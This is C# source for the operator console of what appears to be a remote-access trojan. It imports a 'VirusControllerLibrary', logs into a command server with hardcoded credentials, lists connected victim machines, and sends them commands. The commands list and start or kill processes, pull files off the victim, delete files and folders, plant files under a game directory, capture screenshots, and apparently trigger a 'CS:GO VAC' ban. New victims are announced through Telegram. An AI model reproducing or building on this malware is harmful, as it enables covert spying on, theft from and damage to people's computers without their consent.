using Commands;
using SerializableObjectsLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using VirusControllerLibrary;
using VirusControllerLibrary.Models;

namespace AdminClientCMD
{
    class Program
    {
        //c:\metadata\important.VBS
        private static bool _showTime = true;
        private static bool _autoReconnect = true;
        private static DateTime _currentTime => DateTime.Now;
        private static INotifier _notifier = new TelegramNotifier(123);

        //private static readonly Uri _serverUri = new Uri("http://myfirstserver.somee.com");
        //private static readonly Uri _serverHubUri = new Uri("http://myfirstserver.somee.com/hub");
        private static readonly Uri _serverUri = new Uri("https://localhost:44316/");
        private static readonly Uri _serverHubUri = new Uri("https://localhost:44316/hub");
        private static ServerAdminConnection _serverConnection;

        private static Compressor _compressor;

        static async Task Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            _compressor = new Compressor();

            _serverConnection = new ServerAdminConnection(_serverUri, _serverHubUri,
                username: "Admin", password: "admin_admin",
                OnGetConnectedUsersList,
                OnNotification,
                OnNewConnectionUser,
                OnUserDisconnect,
                OnGetDrives,
                OnGetFiles,
                OnGetRunningProcesses,
                OnGetDownloadFile,
                OnGetProcessingInfo,
                OnGetScreenshot
                );

            _serverConnection.OnSuccessHubConnection += SuccessConnection;
            _serverConnection.OnStopHubConnection += StopConnection;

            await _serverConnection.ConnectToHub();

            await _serverConnection.ExecuteCommandAsync(new GetAllConnectedUsersCommand());

            AdminHubCommand command = null;

            foreach (var connectedUsers in _serverConnection.ConnectedUsers)
            {
                string clientConnectionID = connectedUsers.ConnectionId;
                Console.WriteLine(clientConnectionID);
            }

            Console.WriteLine("Input connectionId what you need: ");
            string connectionId;
            while(true)
            {
                connectionId = Console.ReadLine();
                if (_serverConnection.ConnectedUsers.Any(c => c.ConnectionId == connectionId))
                    break;
                Console.WriteLine("User with this id isn't connected");
            }

            DisplayCommandList();
            while (true)
            {
                if(int.TryParse(Console.ReadLine(), out int choice) == false)
                    continue;

                switch (choice)
                {
                    case 1:
                        Console.Write("Input file path: ");
                        string filePath = Console.ReadLine();
                        command = new GetFilesCommand(connectionId, filePath);
                        break;
                    case 2:
                        command = new GetDriversCommand(connectionId);
                        break;
                    case 3:
                        command = new GetRunningProcessesCommand(connectionId);
                        break;
                    case 4:
                        Console.Write("Input process path: ");
                        string processPath = Console.ReadLine();
                        command = new StartProcessCommand(connectionId, processPath);
                        break;
                    case 5:
                        Console.Write("Input process name: ");
                        string processName = Console.ReadLine();
                        command = new AbortProcessCommand(connectionId, processName);
                        break;
                    case 6:
                        Console.Write("Input file path: ");
                        filePath = Console.ReadLine();
                        command = new DownloadFileCommand(connectionId, filePath);
                        break;
                    case 7:
                        Console.Write("Input file path: ");
                        filePath = Console.ReadLine();
                        command = new DeleteFileCommand(connectionId, filePath);
                        break;
                    case 8:
                        Console.Write("Input file path: ");
                        string directoryPath = Console.ReadLine();
                        command = new DeleteDirectoryCommand(connectionId, directoryPath);
                        break;
                    case 9:
                        Console.Write("Input directory path: ");
                        filePath = Console.ReadLine();
                        command = new SendDirectoryCommand(connectionId, filePath);
                        break;
                    case 10:
                        Console.Write("Input source directory path: ");
                        string sourceDirectryPath = Console.ReadLine();
                        Console.Write("Input target directory path: ");
                        string targetDirectoryPath = Console.ReadLine();

                        command = new SendDirectoryCommand(connectionId, sourceDirectryPath, targetDirectoryPath);
                        break;
                    case 11:
                        Console.Write("Input file path: ");
                        filePath = Console.ReadLine();
                        command = new SendFileCommand(connectionId, filePath: filePath);
                        break;
                    case 12:
                        Console.Write("Input source file path: ");
                        string sourceFilePath = Console.ReadLine();
                        Console.Write("Input target directory path: ");
                        string targetFiePath = Console.ReadLine();

                        command = new SendFileCommand(connectionId, sourceFilePath, targetFiePath);
                        break;
                    case 13:
                        command = new GetProcessingInfoCommand(connectionId);
                        break;
                    case 14:
                        command = new MakeScreenshotCommand(connectionId);
                        break;
                    case 15:
                        command = new TakeVACCommand(connectionId);
                        break;
                    default:
                        Console.WriteLine("Нет такой команды");
                        continue;
                }

                await _serverConnection.ExecuteCommandAsync(command);
                Console.WriteLine("Комманда вызвана успешно");
            }
        }

        private static void OnGetScreenshot(byte[] screenshot)
        {
            byte[] decompressedBytes = new Compressor().DecompressBytes(screenshot);

            string baseDirectoryName = "C:/Downloads";

            if (Directory.Exists(baseDirectoryName) == false)
            {
                Directory.CreateDirectory(baseDirectoryName);
                if (_showTime) Console.Write($"[{_currentTime}] ");
                Console.WriteLine($"New directory {baseDirectoryName}");
            }

            string filePath = baseDirectoryName + "/" + DateTime.Now.ToString("dd/MM/yyyy") + ".jpg";

            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine($"New file {filePath}");
            File.WriteAllBytes(filePath, decompressedBytes);
            Process.Start(filePath);
        }

        private static void StopConnection()
        {
            Console.WriteLine("Соеденение разорвано");
            if (_autoReconnect)
            {
                Console.WriteLine("Пробую переподключится к серверу...");
                _serverConnection.ConnectToHub().Wait();
            }
        }

        private static void OnGetProcessingInfo(string info)
        {
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine(info);
        }

        private static void OnGetConnectedUsersList(IReadOnlyCollection<ConnectedUser> connectedUsers)
        {
            foreach (var connectedUser in connectedUsers)
            {
                Console.WriteLine(new string('-', 25));
                Console.WriteLine("Подключенные пользователи:");
                Console.WriteLine(connectedUser.ConnectionId);
                Console.WriteLine(new string('-', 25));
            }
        }
        private static void OnNewConnectionUser(ConnectedUser connectedUser)
        {
            _serverConnection._connectedUsers.Add(connectedUser);
            Console.Beep();

            string messageString = $"Meet new connection with ID {connectedUser.ConnectionId}";

            if (_showTime)
                messageString = string.Concat($"[{_currentTime}] ", messageString);

            Console.WriteLine(messageString);

            _notifier.NotifyAsync(messageString);
        }

        private static void OnUserDisconnect(ConnectedUser user)
        {
            _serverConnection._connectedUsers.Remove(user);

            string messageString = $"User with Id: {user.ConnectionId} disconnected";
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine(messageString);

            _notifier.NotifyAsync(messageString);
        }

        private static void OnGetDownloadFile(byte[] buffer, string fileName, string fileDirectoryName)
        {
            byte[] decompressedBytes = _compressor.DecompressBytes(buffer);

            string baseDirectoryName = "C:/Downloads";
            string fullDirectoryPath = baseDirectoryName + fileDirectoryName;

            if (Directory.Exists(fullDirectoryPath) == false)
            {
                Directory.CreateDirectory(fullDirectoryPath);
                if (_showTime) Console.Write($"[{_currentTime}] ");
                Console.WriteLine($"New directory {fullDirectoryPath}");
            }

            string filePath = fullDirectoryPath + "/" + fileName;
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine($"New file {filePath}");
            File.WriteAllBytes(filePath, decompressedBytes);
        }

        private static void OnNotification(string message)
        {
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine(message);
            DisplayCommandList();
        }
        private static void SuccessConnection() =>
            Console.WriteLine("ВАС УСПЕШНО ПОДКЛЮЧЕНО К СЕРВЕРУ: ");

        private static void OnGetDrives(List<string> drives)
        {
            Console.WriteLine(new string('-', 20));
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine("Получен список всех дисков:");
            Console.WriteLine($"Count: {drives.Count}");

            foreach (var drive in drives)
                Console.WriteLine(drive);

            Console.WriteLine(new string('-', 20));
            DisplayCommandList();
        }

        private static void OnGetFiles(List<string> files)
        {
            Console.WriteLine(new string('-', 20));
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine("Получен список всех файлов:");
            Console.WriteLine($"Count: {files.Count}");

            foreach (var file in files)
                Console.WriteLine(file);

            Console.WriteLine(new string('-', 20));
            DisplayCommandList();
        }

        private static void OnGetRunningProcesses(List<string> processes)
        {
            Console.WriteLine(new string('-', 20));
            if (_showTime) Console.Write($"[{_currentTime}] ");
            Console.WriteLine("Получен список процесов:");

            processes.GroupBy(p => p).Select(g => g.Key)
                .Where(p => p.Contains("svchost") == false)
                .OrderBy(p=>p)
                .ToList()
                .ForEach(p => Console.WriteLine(p));

            Console.WriteLine(new string('-', 20));

            DisplayCommandList();
        }

        private static void DisplayCommandList()
        {
            string defaultPath = @"D:\GTAV\x64\info";
            Console.WriteLine(
                "1.Get files from...\n" +
                "2.Get drives info\n" +
                "3.Get all processes\n" +
                "4.Start the process\n" +
                "5.Abort the process\n" +
                "6.Download file\n" +
                "7.Delete file\n" +
                "8.Delete full directory\n" +
                $"9.Send directory to {defaultPath}\n" + 
                "10.Send directory to...\n" + 
                $"11.Send file to {defaultPath}\n" +
                "12.Send file to...\n" +
                "13.Get processing info\n" +
                "14.Make screenshot\n" +
                "15.Take cs go VAC");
        }
    }
}
